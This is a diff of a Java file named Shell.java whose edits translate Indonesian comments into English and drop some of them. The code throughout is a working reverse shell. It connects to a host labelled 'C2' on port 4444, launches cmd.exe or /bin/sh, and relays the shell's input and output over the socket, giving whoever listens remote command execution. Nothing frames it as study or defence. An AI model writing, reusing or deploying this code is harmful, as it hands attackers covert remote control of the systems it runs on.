@@ -5,27 +5,26 @@ import java.net.Socket;
 public class Shell {
 
     public static void main(String[] args) {
-        // Konfigurasi alamat server C2
+        // C2 Host configuration
         String host = "127.0.0.1";
-        int port = 4444; // Pastikan port ini sama dengan port listening di server
+        int port = 4444;
 
-        // Menentukan shell berdasarkan sistem operasi target
+        // Defining shell type depend on system
         String shell = System.getProperty("os.name").toLowerCase().contains("win") ? "cmd.exe" : "/bin/sh";
 
         try {
-            // 1. Membuka koneksi TCP ke server C2
+            // 1. Open TCP socket to server
             Socket socket = new Socket(host, port);
 
-            // 2. Menyiapkan proses shell sistem operasi
+            // 2. Configuring shell
             Process process = new ProcessBuilder(shell).redirectErrorStream(true).start();
 
-            // 3. Menghubungkan input/output proses dengan jaringan socket
+            // 3. Get Input or Output from stream
             InputStream processIn = process.getInputStream();
             OutputStream processOut = process.getOutputStream();
             InputStream socketIn = socket.getInputStream();
             OutputStream socketOut = socket.getOutputStream();
 
-            // Thread untuk meneruskan data dari Server (Socket) ke Shell Proses (Input)
             Thread currentThread = Thread.currentThread();
             new Thread(() -> {
                 try {
@@ -38,7 +37,6 @@ public class Shell {
                 } catch (Exception e) {}
             }).start();
 
-            // Thread utama meneruskan output Shell Proses ke Server (Socket)
             byte[] buffer = new byte[1024];
             int length;
             while ((length = processIn.read(buffer)) != -1) {
@@ -46,11 +44,11 @@ public class Shell {
                 socketOut.flush();
             }
 
-            // Membersihkan resource jika koneksi selesai
+            // Gracefull shutdown after connection to server close
             process.destroy();
             socket.close();
         } catch (Exception e) {
-            System.err.println("Gagal terhubung ke C2 Server: " + e.getMessage());
+            System.err.println("Failed connecting to C2 Server: " + e.getMessage());
         }
     }
 }
